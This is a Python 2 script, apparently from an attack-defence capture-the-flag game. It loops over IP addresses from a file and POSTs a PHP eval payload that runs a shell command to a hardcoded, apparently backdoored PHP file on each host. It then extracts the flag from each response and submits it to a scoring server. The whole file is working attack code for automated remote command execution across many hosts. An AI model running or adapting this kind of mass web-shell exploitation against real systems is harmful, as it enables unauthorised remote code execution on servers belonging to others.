# -*- coding: cp936 -*-
import urllib2
import urllib
import re
def check_url(url1):
    postdata = '''a=qrq=eval("echo  `getflag`;die;")'''
    header = {
        'Host': '172.16.100.4:4000',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0',
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Referer': 'http://172.16.100.4:4000/conflict',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Length': '41',
        'Cookie': 'MacaronSession=cc72ad04b0cb846a',
        'Connection': 'close',
    }
    url="http://"+url1+"/8d20d57e2f2b9be5/fb30e70f7813489ddae79be07925a34a.php"
    print url1
    request = urllib2.Request(url,postdata)
    response = urllib2.urlopen(request)
    html = response.read()
    
    if('flag' in html):
        matchObj = re.search( r'flag.*', html, re.M|re.I)
        if matchObj:
           print url1+";"+matchObj.group()
           postdata1 = matchObj.group()
           postdata1 = urllib.urlencode(postdata1)
           request1 = urllib2.Request(url,postdata1,header)
           response = urllib2.urlopen(request1)
        else:
           print url +":"+"出错了"
    
    

def set_payload():
    for line in open("ip.txt"):
        line=line.replace("\n", "")
        #print line
        if(check_url(line)):
            print "flag is "
        
set_payload()
